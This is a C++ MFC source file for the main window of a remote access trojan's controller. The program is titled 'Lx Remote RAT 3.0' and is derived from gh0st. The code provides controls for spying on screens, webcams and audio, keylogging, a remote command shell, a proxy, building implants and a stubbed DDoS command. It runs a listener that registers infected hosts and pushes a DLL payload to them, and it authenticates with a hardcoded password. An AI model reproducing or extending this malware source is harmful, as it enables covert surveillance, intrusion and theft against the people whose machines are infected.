// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "gh0st.h"

#include "MainFrm.h"
#include "gh0stView.h"
#include "MyFileManagerDlg.h"
#include "MyScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "BuildServerDlg.h"
#include "Upipdlg.h"
#include "settingdlg.h"
#include "aboutdlg.h"
#include "ProxyDlg.h"
#include "Splash.h"
#include "LogView.h"

#include "skin.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define WM_ICON_NOTIFY WM_USER+10

Cgh0stView* g_pConnectView = NULL; //在NotifyProc中初始化

extern CLogView* g_pLogView;

CIOCPServer *m_iocpServer = NULL;
CString m_PassWord = "password";
CMainFrame	*g_pFrame; // 在CMainFrame::CMainFrame()中初始化

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWndEx)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWndEx)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_MESSAGE(WM_ICON_NOTIFY, OnTrayNotification)
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_HIDE, OnHide)
	ON_COMMAND(IDM_EXIT, OnExit)
	ON_COMMAND(IDC_ABOUT, OnAbout)
	ON_COMMAND(IDC_EXIT, OnExit1)
	ON_COMMAND(IDC_SETTING, OnSetting)
	ON_COMMAND(IDC_BUILDSERVER, OnBuildServer)
	ON_COMMAND(IDC_UPIP, OnUpIp)
	ON_COMMAND(IDC_DDOS, OnDdos)
	ON_COMMAND(IDC_UNISTALL, OnUninstall)

	ON_WM_TIMER()
	ON_WM_CLOSE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	//	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_INDICATOR_CLOCK,
	ID_STAUTSCOUNT
};

CMainFrame::CMainFrame()
{
	g_pFrame = this;
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWndEx::OnCreate(lpCreateStruct) == -1)
		return -1;

	this->CenterWindow(CWnd::GetDesktopWindow());

	if (!this->CreateExToolBar()) return -1;

	if (!m_wndStatusBar.Create(this) || !m_wndStatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 90);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 90);

	RedrawWindow(NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN);

	RecalcLayout();

	//SetTimer(1,1000,NULL);	//安装定时器，并将其时间间隔设为1000毫秒
	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if (!CFrameWndEx::PreCreateWindow(cs))
		return FALSE;

	cs.cx = 850;
	if (((Cgh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		cs.cx += 100;
	}
	cs.cy = 550;
	cs.style &= ~FWS_ADDTOTITLE;
	//cs.style = WS_BORDER;//固定窗口大小
	cs.style &= ~WS_MAXIMIZEBOX;//禁用最大化
	cs.lpszName = _T("Lx Remote RAT 3.0");

	//loadSkin(IDR_SKIN,_T("SKIN"));

	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	if (m_hWnd == NULL)
		return;     // null (unattached) windows are valid

	// check for special wnd??? values
	ASSERT(HWND_TOP == NULL);       // same as desktop
	if (m_hWnd == HWND_BOTTOM)
		ASSERT(this == &CWnd::wndBottom);
	else if (m_hWnd == HWND_TOPMOST)
		ASSERT(this == &CWnd::wndTopMost);
	else if (m_hWnd == HWND_NOTOPMOST)
		ASSERT(this == &CWnd::wndNoTopMost);
	else
	{
		// should be a normal window
		ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	this->Dump(dc);
}
#endif //_DEBUG

void TransParentDC(CRect rect, CDC * pDC)
{
	CDC m_MemDC;
	m_MemDC.CreateCompatibleDC(pDC);
	CBitmap m_Bitmap;
	m_Bitmap.CreateCompatibleBitmap(pDC, rect.Width(), rect.Height());
	CBitmap *pOldBitmap = m_MemDC.SelectObject(&m_Bitmap);
	m_MemDC.FillSolidRect(0, 0, rect.Width(), rect.Height(), GetSysColor(COLOR_MENU));

	COLORREF cor = pDC->GetPixel(0, 0);
	for (int y = 0; y < rect.Height(); y++)
	{
		for (int x = 0; x < rect.Width(); x++)
		{
			COLORREF ch = pDC->GetPixel(x, y);
			if (ch != cor)
				m_MemDC.SetPixelV(x, y, ch);
		}
	}
	pDC->BitBlt(0, 0, rect.Width(), rect.Height(), &m_MemDC, 0, 0, SRCCOPY);

	m_MemDC.SelectObject(pOldBitmap);
	m_Bitmap.DeleteObject();
}

CSize CMainFrame::LoadMyBitmap(UINT nID)
{
	CDC * pDC = GetDC();
	CDC m_MemDC;
	m_MemDC.CreateCompatibleDC(pDC);
	CSize m_Size = pDC->GetTextExtent("刷新");
	ReleaseDC(pDC);
	CRect rect(0, 0, 60, 32);
	CBitmap *pBitmap, *pOldBitmap;
	pBitmap = new CBitmap;
	pBitmap->LoadBitmap(nID);
	pOldBitmap = m_MemDC.SelectObject(pBitmap);
	TransParentDC(rect, &m_MemDC);
	m_MemDC.SelectObject(pOldBitmap);
	img.Add(pBitmap, GetSysColor(COLOR_MENU));
	pBitmap->DeleteObject();
	delete pBitmap;
	return m_Size;
}

BOOL CMainFrame::CreateExToolBar()
{
	if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC))
	{
		return -1;
	}

	//下面的代码是设置"热"的位图
	img.Create(60, 32, ILC_COLOR32 | ILC_MASK, 2, 2);

	CSize m_Size = LoadMyBitmap(IDB_FILE);
	LoadMyBitmap(IDB_SCREEN);
	LoadMyBitmap(IDB_VEDIO);
	LoadMyBitmap(IDB_SYS);
	LoadMyBitmap(IDB_KEY);
	LoadMyBitmap(IDB_CMD);
	LoadMyBitmap(IDB_SET);
	LoadMyBitmap(IDB_BUILD);
	LoadMyBitmap(IDB_AUDIO);
	LoadMyBitmap(IDB_UNINSTALL);
	LoadMyBitmap(IDB_ABOUT);
	LoadMyBitmap(IDB_EXIT);

	m_wndToolBar.ModifyStyle(0, TBSTYLE_FLAT | CBRS_TOOLTIPS | TBBS_CHECKBOX);	//TBSTYLE_TRANSPARENT
	m_wndToolBar.SetButtons(NULL, 12);

	m_wndToolBar.SetButtonInfo(0, IDC_Folder, TBSTYLE_BUTTON, 0);
	m_wndToolBar.SetButtonText(0, _T("File"));

	m_wndToolBar.SetButtonInfo(1, IDC_SCREEN, TBSTYLE_BUTTON, 1);
	m_wndToolBar.SetButtonText(1, _T("Screen"));

	m_wndToolBar.SetButtonInfo(2, IDC_WEBCAM, TBSTYLE_BUTTON, 2);
	m_wndToolBar.SetButtonText(2, _T("Video"));

	m_wndToolBar.SetButtonInfo(3, IDC_MANAGE, TBSTYLE_BUTTON, 3);
	m_wndToolBar.SetButtonText(3, _T("System"));

	m_wndToolBar.SetButtonInfo(4, IDC_KEYLOGGER, TBSTYLE_BUTTON, 4);
	m_wndToolBar.SetButtonText(4, _T("Keylog"));

	m_wndToolBar.SetButtonInfo(5, IDC_SHELL, TBSTYLE_BUTTON, 5);
	m_wndToolBar.SetButtonText(5, _T("Cmd"));

	//m_wndToolBar.SetButtonInfo(6, IDC_MSG_BUTTONSPLI, TBBS_SEPARATOR, 11);

	m_wndToolBar.SetButtonInfo(6, IDC_SETTING, TBSTYLE_BUTTON, 6);
	m_wndToolBar.SetButtonText(6, _T("Setting"));

	m_wndToolBar.SetButtonInfo(7, IDC_BUILDSERVER, TBSTYLE_BUTTON, 7);
	m_wndToolBar.SetButtonText(7, _T("Build"));

	m_wndToolBar.SetButtonInfo(8, IDC_UPIP, TBSTYLE_BUTTON, 8);
	m_wndToolBar.SetButtonText(8, _T("Set IP"));

	m_wndToolBar.SetButtonInfo(9, IDC_UNISTALL, TBSTYLE_BUTTON, 9);
	m_wndToolBar.SetButtonText(9, _T("Unload"));

	m_wndToolBar.SetButtonInfo(10, IDC_ABOUT, TBSTYLE_BUTTON, 10);
	m_wndToolBar.SetButtonText(10, _T("About"));

	m_wndToolBar.SetButtonInfo(11, IDC_EXIT, TBSTYLE_BUTTON, 11);
	m_wndToolBar.SetButtonText(11, _T("Exit"));

	CToolBarCtrl &pCtrl = m_wndToolBar.GetToolBarCtrl();
	pCtrl.SetImageList(&img);
	pCtrl.SetHotImageList(&img);
	pCtrl.SetButtonSize(CSize(75, 45 + m_Size.cy));
	pCtrl.SetBitmapSize(CSize(60, 32));
	img.Detach();

	CRect rectToolBar;
	m_wndToolBar.GetItemRect(0, &rectToolBar);
	m_wndToolBar.SetSizes(rectToolBar.Size(), CSize(60, 32));

	return TRUE;
}

void CMainFrame::OnBuildServer()
{
	CBuildServerDlg dlg(this);
	dlg.DoModal();
}

void CMainFrame::OnUpIp()
{
	CUpipDlg dlg(NULL);
	dlg.DoModal();
}

void CMainFrame::OnDdos()
{
	::MessageBox(NULL, _T("紧张开发中"), _T("OK"), MB_OK);

	//	BYTE	bToken = COMMAND_DDOS;
	//	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CMainFrame::OnSetting()
{
	CSettingDlg dlg(this);
	dlg.DoModal();
}

void CMainFrame::OnUninstall()
{
	g_pConnectView->RemoveHost();
}

void CMainFrame::OnAbout()
{
	CAboutDlg dlg(NULL);
	dlg.DoModal();
}

void CMainFrame::OnExit1()
{
	OnClose();
}

//////////////////////////////Ture clolor Toolbar end////////////////////////////////

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*)lpParam;

		// 对g_pConnectView 进行初始化
		g_pConnectView = (Cgh0stView *)((Cgh0stApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView还没创建，这情况不会发生
		if (((Cgh0stApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;

		//	str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		//	g_pFrame->m_wndStatusBar.SetPaneText(1, str);

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			//g_pConnectView->SendDll(pContext);
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}
	catch (...)
	{
		MsgErr(_T("Notify Proc Err:%d"), nCode);
	}
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString str;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}

	m_iocpServer = new CIOCPServer;

	// 开启IPCP服务器
	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
	{
		char hostname[256];
		//char remark[256];
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{
			for (int i = 0;; i++)
			{
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if (host->h_addr_list[i] + host->h_length >= host->h_name)
					break;
				str += "/";
			}
		}

		str.Format(_T("监听端口: %d"), nPort);
		m_wndStatusBar.SetPaneText(1, str);
	}
	else
	{
		ErrMsg(_T("Listen Failed"));
		m_wndStatusBar.SetPaneText(1, _T("监听端口: 0"));
	}

	m_wndStatusBar.SetPaneText(3, _T("连接数: 0"));
}

typedef struct _tagItem
{
	HTREEITEM hItem;
	char szName[128];
}ONLINEITEM;

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialogEx *dlg = (CDialogEx	*)pContext->m_Dialog[1];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case MyFileManager_DLG:
			((CMyFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case MyScreenSpy_DLG:
			((CMyScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case PROXY_DLG:
			((CProxyDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // 要求验证
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
	{
		BYTE bToken = COMMAND_REPLAY_HEARTBEAT;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
	}

	break;
	case TOKEN_LOGIN: // 上线包
	{
		if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
		{
			closesocket(pContext->m_Socket);
		}
		else
		{
			LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
			//		Cgh0stView* apView = new Cgh0stView;
			//		((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView(LoginInfo->HostReMark, apView, "Connections Users");
			///g_pConnectView
			pContext->m_bIsMainSocket = true;
			g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);//增加到列表去
		}
		// 激活
		BYTE bToken = COMMAND_ACTIVED;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
	}

	break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENMyScreenSpyDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;

	case TOKEN_AUDIO_START: // 语音
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PROXY_START:
		g_pConnectView->PostMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_INFO_YES: //主机筛选
		g_pConnectView->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
		break;
	case TOKEN_INFO_NO: //主机筛选
		g_pConnectView->PostMessage(WM_NOMODIFYLIST, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作

	case TOKEN_SER_BUF:		// Empty host for dll buf
		//g_pConnectView->SendDll(pContext);
		break;

	default:
		closesocket(pContext->m_Socket);
		break;
	}
}

typedef struct _MsgHead
{
	int id;
	int buflen;
	DWORD lp;
}Msghead, *LPMsghead;

const WCHAR LoadDll[] = _T("LoadDll.dll");

void SendDll(ClientContext *pContext)
{
	Msghead msg;
	HANDLE hFile;

	hFile = CreateFile(LoadDll, GENERIC_ALL, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		MsgErr(_T("Err Read Dll"));
		return;
	}

	DWORD dwSize = GetFileSize(hFile, NULL);
	msg.id = 93226;
	msg.buflen = dwSize;
	send(pContext->m_Socket, (LPCSTR)&msg, sizeof(msg), 0);

	LPVOID lpbuf = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	ReadFile(hFile, lpbuf, dwSize, &dwSize, NULL);

	CloseHandle(hFile);

	send(pContext->m_Socket, (LPCSTR)lpbuf, dwSize, 0);
	VirtualFree(lpbuf, dwSize);

	return;
	
}

const int AuthId = 93226;

// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	Msghead *lp = (Msghead*)pContext->m_byInBuffer;

	if (lp->id == AuthId)
	{
		SendDll(pContext);
		return;
	}

	// 如果管理对话框打开，交给相应的对话框处理
	CDialogEx *dlg = (CDialogEx	*)pContext->m_Dialog[1];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case MyScreenSpy_DLG:
			((CMyScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::OnClose()
{
	m_TrayIcon.RemoveIcon();
	m_iocpServer->Shutdown();
	delete m_iocpServer;
	KillTimer(1);	//销毁定时器
	CFrameWndEx::OnClose();
}

LRESULT CMainFrame::OnTrayNotification(WPARAM wParam, LPARAM lParam)
{
	if (LOWORD(lParam) == WM_LBUTTONDBLCLK)
	{
		ShowWindow(SW_SHOW);
		return TRUE;
	}
	return m_TrayIcon.OnTrayNotification(wParam, lParam);
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		if (!m_TrayIcon.Enabled())
			m_TrayIcon.Create(this, WM_ICON_NOTIFY, _T("Running ...."), AfxGetApp()->LoadIcon(IDR_MAINFRAME), IDR_MINIMIZE, TRUE); //构造
		ShowWindow(SW_HIDE);
	}
	else
	{
		CFrameWndEx::OnSysCommand(nID, lParam);
	}
}

void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str;
	str.Format(_T("连接: %d"), g_pConnectView->GetListCtrl().GetItemCount());
	m_wndStatusBar.SetPaneText(3, str);
}

void CMainFrame::OnShow()
{
	ShowWindow(SW_SHOW);
	::SetForegroundWindow(m_hWnd);
}

void CMainFrame::OnHide()
{
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnExit()
{
	OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{
	g_pFrame->m_TrayIcon.SetTooltipText(lpszText);
}

void CMainFrame::OnTimer(UINT nIDEvent)
{
	// TODO: Add your message handler code here and/or call default

	CTime time;
	time = CTime::GetCurrentTime();	//得到当前时间

	CString s = time.Format(_T("%H:%M:%S"));		//转换时间格式
	m_wndStatusBar.SetPaneText(m_wndStatusBar.CommandToIndex(ID_INDICATOR_CLOCK), s);	//显示时钟

	CFrameWndEx::OnTimer(nIDEvent);
}